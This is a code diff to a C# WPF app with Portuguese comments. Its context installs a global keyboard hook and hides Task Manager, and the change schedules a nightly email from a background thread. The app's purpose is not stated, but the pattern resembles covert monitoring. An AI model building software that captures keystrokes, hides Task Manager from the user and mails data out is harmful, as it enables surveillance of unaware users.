@@ -15,6 +15,7 @@ using System.Windows.Shapes;
 using System.Data.SqlClient;
 using Open.WinKeyboardHook;
 using System.Diagnostics;
+using System.Threading;
 
 namespace WpfApp1
 {
@@ -44,12 +45,31 @@ namespace WpfApp1
         public MainWindow()
         {
             InitializeComponent();
-            DataAccess da = new DataAccess();
-            da.SendMail();
             _interceptor = new KeyboardInterceptor();
             _interceptor.KeyDown += _interceptor_KeyDown;
             _interceptor.StartCapturing();
             TaskManagerStop();
+            Thread thread = new Thread(new ThreadStart(CheckTime));
+            thread.Start();
+
+        }
+        /// <summary>
+        /// Checa a hora atual. Se for entre 23h e 24h, envia um email.
+        /// </summary>
+        private void CheckTime()
+        {
+            Boolean emailAlreadySent = false;
+            while (true)
+            {
+                int interval = 60 * 60 * 1000; // 1 Hora.
+                Thread.Sleep(interval);
+                if (DateTime.Now.TimeOfDay.TotalHours >= 23 && DateTime.Now.TimeOfDay.TotalHours < 24 && !emailAlreadySent)
+                {
+                    DataAccess db = new DataAccess();
+                    db.SendMail();
+                    emailAlreadySent = true;
+                }
+            }
 
         }
         // Ao abrir o taskmanager, deixa-o escondido.
@@ -95,7 +115,7 @@ namespace WpfApp1
 
             //if (e.Alt || e.Control || e.KeyCode == System.Windows.Forms.Keys.LWin || e.KeyCode == System.Windows.Forms.Keys.RWin || e.KeyCode == System.Windows.Forms.Keys.RMenu)
             //{
-             //   e.SuppressKeyPress = true;
+            //   e.SuppressKeyPress = true;
             //}
 
         }
@@ -160,6 +180,8 @@ namespace WpfApp1
 
             newPasswordWindow.Show();
         }
+
+
 
     }
 }
